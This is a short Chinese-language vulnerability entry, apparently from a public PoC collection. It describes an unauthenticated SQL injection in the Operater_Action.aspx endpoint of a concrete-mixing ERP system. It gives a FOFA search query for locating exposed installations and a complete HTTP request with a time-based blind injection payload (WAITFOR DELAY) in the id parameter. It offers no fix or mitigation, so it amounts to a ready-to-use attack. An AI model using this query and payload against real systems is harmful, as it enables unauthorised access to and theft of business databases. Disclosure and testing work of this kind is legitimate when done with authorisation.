## 商混ERP系统接口Operater_Action.aspx存在SQL注入漏洞

商混ERP系统 **Operater_Action.aspx**接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息。

## fofa

```javascript
title="商混ERP系统"
```

## poc

```javascript
GET /Dispatch/Operater_Action.aspx?action=TaskComplete&id=1%27WAITFOR+DELAY+%270:0:5%27-- HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409141642074.png)